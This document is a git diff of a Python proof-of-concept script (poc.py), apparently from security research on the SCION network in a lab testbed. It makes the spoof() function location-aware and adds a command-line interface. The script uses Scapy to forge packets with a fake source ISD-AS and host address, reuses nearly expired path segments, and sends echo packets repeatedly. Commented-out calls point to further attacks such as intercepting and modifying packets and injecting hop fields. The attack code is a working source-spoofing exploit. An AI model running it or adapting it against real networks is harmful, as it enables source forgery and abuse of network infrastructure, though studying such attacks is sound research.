@@ -1,3 +1,4 @@
+from enum import Enum
 import socket
 import sys
 import time
@@ -19,6 +20,20 @@ br_port = 30042
 br_addr = "192.168.111.1"
 br_iface = "eth1"  # interface to borderrouter
 
+class Location(Enum):
+    Zurich = "2:0:2b"
+    Thun = "2:0:2c"
+    Lausanne = "2:0:2d"
+
+class BR_addresses(Enum):
+    Zurich = "192.168.111.1"
+    Thun = "192.168.110.1"
+    Lausanne = "192.168.112.1"
+
+class Kali_addresses(Enum):
+    Zurich = "192.168.111.25"
+    Thun = "192.168.110.78"
+    Lausanne = "192.168.112.15"
 
 def capture_path(scion: str, src_br: str, sciond: str, dest: str, timeout: Optional[int] = 1,
                  extra_args: List[str] = [], capture_output: bool = False, interface: str = 'lo') -> Union[SCION, Tuple[SCION, str]]:
@@ -548,7 +563,7 @@ def interceptAndModify():
     ss.send(resp)
     s.close()
 
-def spoof():
+def spoof(src_loc: Location, dst_loc: Location):
     """
     Sends valid packet with valid (but almost expired) path to the destination.
     Packet contains spoofed source ISD-AS/address info.
@@ -561,7 +576,7 @@ def spoof():
 
 
     dstISD = 64
-    dstAS = "2:0:2c"
+    dstAS = dst_loc.value
     dst_IA = f"{dstISD}-{dstAS}"
 
     paths = fetch_paths(dst_IA)
@@ -569,14 +584,14 @@ def spoof():
     # seq_ZH_TH = "64-2:0:2b#0,1 64-559#24,15 64-6730#9,8 64-3303#10,21 64-2:0:2c#1,0"
     # seq_ZH_LA = "64-2:0:2b#0,1 64-559#24,15 64-6730#9,25 64-2:0:2d#1,0"
     # seq_TH_LA = "64-2:0:2c#0,1 64-3303#21,10 64-6730#8,25 64-2:0:2d#1,0",
-
-    SCION_path = choose_path(dst_IA, paths) # just take one
+    br_addr = BR_addresses[src_loc.name].value
+    SCION_path = choose_path(dst_IA, paths, br_addr=br_addr) # just take one
 
     all_down_segments = {}
-    with open("path_seg_thun.json", "r") as f:
+    with open(f"path_seg_{src_loc.name}-{dst_loc.name}.json", "r") as f:
         all_down_segments = json.load(f)
     
-    print("All paths = ", all_down_segments)
+    # print("All paths = ", all_down_segments)
     keys = [datetime.datetime.strptime(k, "%Y-%m-%d %H:%M:%S") for k in all_down_segments.keys()]
     now = datetime.datetime.now() + datetime.timedelta(seconds=10)
     bigger_time = sorted([k for k in keys if k + datetime.timedelta(hours=6) > now])
@@ -592,7 +607,6 @@ def spoof():
     #         "003f000200003e940457803b"
     #     ],
     #     "InfoFields": "01005a7a66559a2f",
-    #     "Timestamp": "2024-05-28 10:47:43"
     # }
     entry = all_down_segments[next_time.strftime("%Y-%m-%d %H:%M:%S")]
     
@@ -603,12 +617,12 @@ def spoof():
     SCION_path.Path.InfoFields[-1].show()
     SCION_path.Path.HopFields[-seg2len:] = my_hopfields
 
-    dstAddr = "192.168.110.78"
+    dstAddr = Kali_addresses[dst_loc.name].value
     bind_layers(UDP, SCION, dport=br_port)
     bind_layers(UDP, SCION, sport=br_port)
     myIP = IP()
-    myIP.src = "192.168.111.25"
-    myIP.dst = br_addr # address of border router (NOT! actual destination address)
+    myIP.src = Kali_addresses[src_loc.name].value
+    myIP.dst = BR_addresses[src_loc.name].value # address of border router (NOT! actual destination address)
     # myIP.flags = "DF" # Don't fragment (less important?)
 
     myUDP = UDP()
@@ -617,11 +631,13 @@ def spoof():
 
     mySCION = SCION_path
     mySCION.SrcISD = 64
-    mySCION.SrcAS = "2:0:2d" # spoofed AS
+    spoofed_loc = [loc for loc in Location if loc != src_loc and loc != dst_loc][0]
+    mySCION.SrcAS = spoofed_loc.value # spoofed AS
     mySCION.PathType = 1
     mySCION.DstHostAddr = dstAddr
-    mySCION.SrcHostAddr = "192.168.112.15" # spoofed address
+    mySCION.SrcHostAddr = Kali_addresses[spoofed_loc.name].value # spoofed address
 
+    print("spoofed_loc = ", spoofed_loc)
     mySCMP = SCMP(Message=EchoRequest(Identifier=0xabcd, Data=b"A"*13))
 
     p = myIP/myUDP/mySCION
@@ -633,7 +649,8 @@ def spoof():
     del p[SCION].NextHdr
     del p[SCION].HdrLen
     del p[SCION].PayloadLen
-    # p.show2()
+    p.show2()
+    input("good?")
     # p.pdfdump("output/sent_packet.pdf")
     
     print("Next time = ", next_time, next_time + datetime.timedelta(hours=6))
@@ -645,14 +662,15 @@ def spoof():
     print("Expire time = ", expire_time)
     i = 1
     while(wait_time_sec > 3):
-        print("Now = ", datetime.datetime.now(), " waiting for: ", wait_time_sec)
+        hex_i = i.to_bytes(2, byteorder='big').hex()
+        print("i =", i, "hex(i) =", hex_i,  "Now = ", datetime.datetime.now(), " waiting for: ", wait_time_sec)
         mySCMP = SCMP(Message=EchoRequest(Identifier=0xabcd, Data=i.to_bytes(10, byteorder='big')))
         i += 1
         send(p/mySCMP, iface=br_iface, count=1)
         time.sleep(1)
         wait_time = expire_time - datetime.datetime.now() - delta
         wait_time_sec = wait_time.seconds + wait_time.microseconds / 1000000
-    
+
     print("i = ", i)
     mySCMP = SCMP(Message=EchoRequest(Identifier=0xabcd, Data=i.to_bytes(10, byteorder='big')))
     p = p/mySCMP
@@ -664,7 +682,10 @@ def spoof():
 
 
 if __name__ == "__main__":
-    # base()
+    args = sys.argv
+    operation = args[1]
+    if operation == "base":
+        base()
     # emptyInfo()
     # for i in range(100):
     #     addHopFields()
@@ -676,4 +697,20 @@ if __name__ == "__main__":
     #     addHopFields(nr_new_hops=nr_hops)
     # wrongNewPath()
     # interceptAndModify()
-    spoof()
+    elif operation == "spoof":
+        if len(args) != 4:
+            print("Usage: sudo python poc.py spoof <from_location> <to_location>")
+            sys.exit(1)
+        from_location = args[2]
+        to_location = args[3]
+        if from_location not in Location.__members__:
+            print("Invalid from location")
+            print("Valid locations are: ", [loc.name for loc in Location])
+            sys.exit(1)
+        if to_location not in Location.__members__:
+            print("Invalid to location")
+            print("Valid locations are: ", [loc.name for loc in Location])
+            sys.exit(1)
+        from_loc = Location[from_location]
+        to_loc = Location[to_location]
+        spoof(from_loc, to_loc)
